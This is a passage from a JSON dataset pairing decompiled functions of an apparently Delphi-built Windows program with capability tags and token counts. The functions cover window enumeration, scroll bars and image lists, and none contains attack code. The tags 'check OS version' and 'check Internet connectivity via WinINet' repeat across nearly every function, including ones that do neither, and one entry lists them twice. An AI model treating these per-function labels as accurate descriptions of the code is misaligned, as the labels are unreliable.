        "decompiled_code": "\nvoid fcn.0045496c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (*0x496578 == 0) {\n        *0x496578 = fcn.0040cdf4();\n        if (0x5ffff < *0x496578) {\n            iVar1 = sub.kernel32.dll_GetModuleHandleA_2();\n            if (iVar1 != 0) {\n                *0x49657c = sub.kernel32.dll_GetProcAddress_1();\n            }\n        }\n    }\n    puStack40 = 0x4549cb;\n    iVar1 = fcn.0041c03c(0);\n    uStack44 = 0x454a66;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (*0x49657c == NULL) {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        puStack40 = &stack0xfffffffc;\n        uVar3 = fcn.00453564(iVar1);\n        iVar1 = sub.comctl32.dll_ImageList_Write();\n        if (iVar1 == 0) {\n            fcn.0040c668();\n            fcn.004047cc();\n        }\n    }\n    else {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        uVar3 = 1;\n        puStack40 = &stack0xfffffffc;\n        uVar2 = fcn.00453564(1, iVar1);\n        iVar1 = (**0x49657c)(uVar2);\n        if (iVar1 != 0) {\n            fcn.0040c668();\n            fcn.004047cc();\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    uStack48 = 0x454a6d;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 468
    },
    "00454ab4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00454ab4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (0 < *(in_EAX + 0x5c)) {\n        *(in_EAX + 0x5c) = *(in_EAX + 0x5c) + -1;\n    }\n    if (*(in_EAX + 0x58) != '\\0') {\n        *(in_EAX + 0x58) = 0;\n        fcn.00404154();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "00455234": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00455234(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041b50c();\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 0x30) = uVar1;\n    iVar2 = fcn.00403f28();\n    *(in_EAX + 0x34) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x4553b8;\n    *(in_EAX + 0x58) = 0;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 273
    },
    "004554b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint64_t fcn.004554b0(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uStack20;\n    \n    uStack20 = uStack20 & 0xffffff00;\n    cVar2 = fcn.0043db84();\n    if (cVar2 == '\\0') {\n        fcn.004582e4();\n        iVar4 = fcn.004398d8();\n        if ((iVar4 != 0) && (iVar6 = *(*(in_EAX + 0x30) + 8),  -1 < iVar6 + -1)) {\n            iVar7 = 0;\n            do {\n                piVar1 = *(*(*(in_EAX + 0x30) + 4) + iVar7 * 4);\n                cVar2 = fcn.004040e4();\n                if (cVar2 != '\\0') {\n                    if (iVar4 == *(piVar1 + 0x21)) {\ncode_r0x00455537:\n                        uVar3 = (**(*piVar1 + 0x50))();\n                        uStack20 = uStack20 | uVar3;\n                        break;\n                    }\n                    if (piVar1[0x24] != 0) {\n                        fcn.00455d80();\n                        iVar5 = fcn.00455de0();\n                        if (iVar5 != -1) goto code_r0x00455537;\n                    }\n                }\n                iVar7 = iVar7 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n        }\n    }\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 416
    },
    "004558e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004558e4(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x1a) != '\\0') {\n        return;\n    }\n    *(in_EAX + 0x1a) = 1;\n    uStack28 = 0x4559dc;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (param_2 != *(in_EAX + 0x69)) {\n        iVar4 = *(in_EAX[0x14] + 8);\n        puVar1 = &stack0xfffffffc;\n        if (-1 < iVar4 + -1) {\n            do {\n                puStack24 = puVar1;\n                piVar3 = fcn.00404108();\n                if (piVar3 != NULL) {\n                    (**(*piVar3 + 0x50))();\n                }\n                iVar4 = iVar4 + -1;\n                puVar1 = puStack24;\n            } while (iVar4 != 0);\n        }\n        *(in_EAX + 0x69) = param_2;\n        if (((0 < in_EAX[0x1b]) && (*(in_EAX + 0x69) != '\\0')) && (iVar4 = fcn.0045537c(),  -1 < iVar4 + -1)) {\n            do {\n                piVar3 = fcn.00455368();\n                if (((piVar3 != in_EAX) && (cVar2 = fcn.004040e4(),  cVar2 != '\\0')) && (piVar3[0x1b] == in_EAX[0x1b]))\n                {\n                    fcn.004558e4();\n                }\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        (**(*in_EAX + 0x30))();\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0x1a) = 0;\n    return;\n}\n",
        "token_count": 533
    },
    "004559ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004559ec(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 0x6a)) {\n        if (in_EAX[0x17] != 0) {\n            cVar1 = *(in_EAX[0x17] + 0x58);\n            if (cVar1 == '\\x01') {\n                *(in_EAX + 0x6a) = param_2;\n                return;\n            }\n            if (cVar1 == '\\x02') {\n                param_2 = '\\x01';\n            }\n        }\n        iVar3 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                piVar2 = fcn.00404108();\n                if (piVar2 != NULL) {\n                    (**(*piVar2 + 0x54))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *(in_EAX + 0x6a) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "00455d80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00455d80(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x90) == 0) {\n        uVar1 = fcn.00403f28();\n        *(in_EAX + 0x90) = uVar1;\n    }\n    return *(in_EAX + 0x90);\n}\n",
        "token_count": 88
    },
    "00457f7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00457f7c(void)\n\n{\n    if (*(*0x496584 + 0x30) != 0) {\n        fcn.0046146c();\n    }\n    fcn.00462d08();\n    fcn.0041b7c0();\n    fcn.0041b764();\n    return;\n}\n",
        "token_count": 76
    },
    "00458100": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00458100(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h != *0x491744) && (arg_8h != *(*0x496584 + 0x30))) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = sub.user32.dll_IsWindowEnabled(arg_8h);\n            if (iVar1 != 0) {\n                uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n                if ((uVar2 & 8) == 0) {\n                    if (*0x491748 == 0) {\n                        *0x491748 = arg_8h;\n                    }\n                }\n                else if (*0x49174c == 0) {\n                    *0x49174c = arg_8h;\n                }\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 228
    },
    "00458164": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00458164(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    *0x491748 = 0;\n    *0x49174c = 0;\n    *0x491744 = in_EAX;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.00458100, 0);\n    sub.user32.dll_EnumThreadWindows(uVar1);\n    if (*0x491748 != 0) {\n        return *0x491748;\n    }\n    return *0x49174c;\n}\n",
        "token_count": 127
    },
    "004583e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004583e0(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    do {\n        if (param_2 == '\\0') {\n            cVar1 = fcn.004040e4();\n            if (cVar1 != '\\0') {\ncode_r0x00458406:\n                cVar1 = fcn.004040e4();\n                if (cVar1 != '\\0') {\n                    return in_EAX;\n                }\n                return 0;\n            }\n        }\n        if (*(in_EAX + 0x30) == 0) goto code_r0x00458406;\n        in_EAX = *(in_EAX + 0x30);\n    } while( true );\n}\n",
        "token_count": 173
    },
    "00458598": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00458598(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x18) == '\\0') {\n        cVar1 = fcn.00458758();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.00445cbc();\n            if (cVar1 == '\\0') {\n                fcn.00458cc8();\n            }\n            else {\n                fcn.00458cc8();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "004585d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004585d0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        cVar1 = *(in_EAX + 0x5b);\n        if ((cVar1 == '\\0') || (cVar1 == '\\x03')) {\n            if ((*(in_EAX + 0x5b) == '\\x03') || (*0x45863c == (*0x458638 & *(in_EAX + 0x61)))) {\n                iVar3 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x40) + *(in_EAX + 0x48);\n                iVar2 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar3) {\n                    iVar2 = iVar3;\n                }\n                *(arg_8h + -4) = iVar2;\n            }\n        }\n        else if (cVar1 == '\\x04') {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x48);\n        }\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "00458640": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458640(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        if (*(in_EAX + 0x5b) < 2) {\n            if ((*(in_EAX + 0x5b) == '\\x01') || (*0x4586a8 == (*0x4586a4 & *(in_EAX + 0x61)))) {\n                iVar2 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n                iVar1 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar2) {\n                    iVar1 = iVar2;\n                }\n                *(arg_8h + -4) = iVar1;\n            }\n        }\n        else if (*(in_EAX + 0x5b) == 2) {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x4c);\n        }\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "004586ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004586ac(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 4) + 0x96) != '\\0') {\n        cVar1 = (**(**(in_EAX + 4) + 0xd8))();\n        if (cVar1 == '\\0') {\n            fcn.00458e00();\n        }\n        else {\n            iVar2 = fcn.00449558();\n            if (-1 < iVar2 + -1) {\n                do {\n                    if (*(in_EAX + 0x18) == '\\0') {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.0044951c();\n                        fcn.004585d0(puVar3);\n                    }\n                    else {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.0044951c();\n                        fcn.00458640(puVar3);\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            fcn.00458e00();\n        }\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "00458758": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00458758(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (*(in_EAX + 0x18) == '\\x01') {\n        uVar3 = 0x200000;\n    }\n    if (*(in_EAX + 0x1c) != '\\0') {\n        uVar1 = fcn.0044d1c8(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & uVar3) != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 170
    },
    "00458790": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00458790(uint arg_8h)\n\n{\n    int16_t in_AX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (in_AX == 1) {\n        uVar3 = 0x200000;\n    }\n    uVar1 = fcn.0044d1c8(0xfffffff0);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    return uVar2 & 0xffffff00 | (uVar2 & uVar3) != 0;\n}\n",
        "token_count": 145
    },
    "004587c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004587c4(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort in_DX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (*(arg_8h + -5) == '\\0') {\n        if ((*(arg_8h + -6) != '\\0') && (cVar1 = fcn.00458790(arg_8h),  cVar1 == '\\0')) {\n            iVar2 = (***0x4929e4)(in_DX);\n            return -(iVar2 - *(arg_8h + -0xc));\n        }\n        if ((*(arg_8h + -6) == '\\0') && (cVar1 = fcn.00458790(arg_8h),  cVar1 != '\\0')) {\n            iVar2 = (***0x4929e4)(in_DX);\n            iVar2 = iVar2 - *(arg_8h + -0xc);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 225
    },
    "00458840": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00458840(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar1 = fcn.0044d1c8(0xfffffff0);\n    sub.user32.dll_GetWindowLongA(uVar1);\n    if (*(in_EAX + 0x18) == '\\x01') {\n        iVar2 = fcn.004587c4(&stack0xfffffffc);\n        iVar3 = fcn.00444f5c();\n        iVar2 = iVar2 + iVar3;\n    }\n    else {\n        iVar2 = fcn.004587c4(&stack0xfffffffc);\n        iVar3 = fcn.00444f18();\n        iVar2 = iVar2 + iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 197
    },
    "004588d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004588d8(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_4h;\n    \n    var_1ch = 0x1c;\n    var_18h = 0x10;\n    iVar1 = *(*(arg_8h + -8) + 6);\n    uVar2 = fcn.0044d1c8(*(*(arg_8h + -4) + 0x18) == '\\x01', &var_1ch);\n    iVar3 = (***0x492a5c)(uVar2);\n    iVar4 = iVar1;\n    if (iVar3 != 0) {\n        iVar4 = var_4h;\n    }\n    return iVar4;\n}\n",
        "token_count": 206
    },
    "00458cc8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458cc8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    if ((*(*(in_EAX + 4) + 0x1c) & 2) == 0) {\n        iVar1 = *(in_EAX + 0x14);\n        if ((param_2 <= iVar1) && (iVar1 = param_2,  param_2 < 0)) {\n            iVar1 = 0;\n        }\n        bVar3 = *(in_EAX + 0x18) != '\\0';\n        if (iVar1 != *(in_EAX + 0xc)) {\n            *(in_EAX + 0xc) = iVar1;\n            if (*(in_EAX + 0x18) == '\\0') {\n                fcn.0044cd74();\n            }\n            else {\n                fcn.0044cd74();\n            }\n            if ((((*(*(in_EAX + 4) + 0x1c) & 0x10) != 0) && (iVar1 = fcn.00458424(),  iVar1 != 0)) &&\n               (*(iVar1 + 0x298) != 0)) {\n                (**(**(iVar1 + 0x298) + 0xc))();\n            }\n        }\n        uVar2 = fcn.0044d1c8(bVar3);\n        iVar1 = (***0x492be4)(uVar2);\n        if (iVar1 != *(in_EAX + 0xc)) {\n            uVar2 = fcn.0044d1c8(bVar3, *(in_EAX + 0xc), 0xffffffff);\n            (***0x4929a0)(uVar2);\n        }\n    }\n    else {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 430
    },
    "00458e48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458e48(int32_t arg_8h)\n\n{\n    char in_AL;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t arg_14h;\n    \n    piVar3 = arg_8h + -4;\n    arg_14h = -(in_AL != '\\0');\n    uVar4 = *(*(*piVar3 + 0x34) * 4 + 0x491790);\n    uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x491768);\n    uVar1 = fcn.0044d1c8();\n    fcn.004377dc(uVar1, uVar2, uVar4, arg_14h);\n    if (0 < *(*piVar3 + 0x24)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x24);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x49176c);\n        uVar1 = fcn.0044d1c8();\n        fcn.004377dc(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x38)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x38);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x491770);\n        uVar1 = fcn.0044d1c8();\n        fcn.004377dc(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x30)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x30);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x491774);\n        uVar1 = fcn.0044d1c8();\n        fcn.004377dc(uVar1, uVar2, uVar4, uVar5);\n    }\n    uVar5 = 0;\n    uVar2 = fcn.0042074c();\n    uVar4 = *(*(*piVar3 + 0x18) * 0x14 + 0x491778);\n    uVar1 = fcn.0044d1c8();\n    fcn.004377dc(uVar1, uVar4, uVar2, uVar5);\n    return;\n}\n",
        "token_count": 600
    },
    "00458f50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00458f50(uint param_1, uchar param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    int32_t var_12h;\n    uint var_eh;\n    uint var_ah;\n    int32_t var_6h;\n    \n    *(in_EAX + 0x14) = 0;\n    cVar1 = *(in_EAX + 0x18);\n    var_6h._1_1_ = param_2;\n    unique0x100000a4 = in_EAX;\n    if (*(in_EAX + 0x1c) != '\\0') {\n        iVar2 = fcn.00458840();\n        iVar2 = *(stack0xfffffff8 + 0x10) - iVar2;\n        *(stack0xfffffff8 + 0x14) = iVar2;\n        if (iVar2 < 0) {\n            *(stack0xfffffff8 + 0x14) = 0;\n        }\n    }\n    var_22h = 0x1c;\n    var_1eh = 0x17;\n    var_1ah = 0;\n    if (*(stack0xfffffff8 + 0x14) < 1) {\n        var_16h = 0;\n    }\n    else {\n        var_16h = *(stack0xfffffff8 + 0x10);\n    }\n    var_12h = fcn.00458840();\n    var_12h = var_12h + 1;\n    var_eh = *(stack0xfffffff8 + 0xc);\n    var_ah = var_eh;\n    fcn.00458e48(&stack0xfffffffc);\n    *(stack0xfffffff8 + 0x44) = 0;\n    uVar3 = fcn.0044d1c8(cVar1 == '\\x01', &var_22h, 0xffffffff);\n    (***0x492ccc)(uVar3);\n    fcn.00458cc8();\n    iVar2 = fcn.00458840();\n    uVar4 = (iVar2 * 9) / 10;\n    *(stack0xfffffff8 + 10) = uVar4;\n    if (*(stack0xfffffff8 + 0x1f) != '\\0') {\n        *(stack0xfffffff8 + 8) = (uVar4 & 0xffff) / 10;\n    }\n    return;\n}\n",
        "token_count": 596
    },
    "004591b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004591b0(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00403f28();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar4 = fcn.00444f18();\n    iVar5 = *(in_EAX + 0x250);\n    cVar2 = fcn.00458758();\n    if ((cVar2 == '\\0') || (*(iVar5 + 0x10) <= iVar4)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        fcn.00458cc8();\n    }\n    iVar5 = fcn.00449558();\n    if (-1 < iVar5 + -1) {\n        do {\n            fcn.0044951c();\n            fcn.0044951c();\n            fcn.00414d8c();\n            fcn.00444c04();\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    iVar5 = *(iVar3 + 8);\n    if (-1 < iVar5 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00414eec();\n            fcn.00446870(arg_8h);\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    if (bVar1) {\n        fcn.00458598();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 432
    },
    "004592c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004592c8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x25c) < 1) {\n        fcn.004586ac();\n        fcn.004586ac();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00459348": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
